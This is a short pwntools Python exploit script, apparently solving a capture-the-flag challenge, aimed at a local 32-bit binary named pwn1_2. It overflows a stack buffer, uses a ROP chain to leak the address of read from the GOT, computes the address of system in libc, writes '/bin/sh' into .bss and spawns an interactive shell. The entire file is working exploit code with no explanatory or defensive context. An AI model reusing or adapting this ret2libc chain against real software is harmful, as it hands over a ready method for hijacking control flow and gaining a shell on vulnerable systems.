from pwn import *
#context.log_level = 'debug'

cn = process('./pwn1_2')
bin = ELF('./pwn1_2')
libc = ELF('/lib32/libc.so.6')

p3ret = 0x080484f9

stuff = 'a'*0x28 + 'bbbb'

pay = p32(bin.plt['write']) + p32(p3ret) + p32(1) + p32(bin.got['read']) + p32(4)
pay += p32(bin.symbols['main'])
cn.sendline(stuff+pay)
cn.recv(0x100)
p_read = u32(cn.recv(4))

p_system = p_read - libc.symbols['read'] + libc.symbols['system']

pay = p32(bin.plt['read']) + p32(p3ret) + p32(0) + p32(bin.bss()) + p32(0x10)
pay += p32(p_system) + 'bbbb' + p32(bin.bss())
cn.sendline(stuff + pay)
cn.recv()
cn.sendline('/bin/sh\0')
cn.interactive()
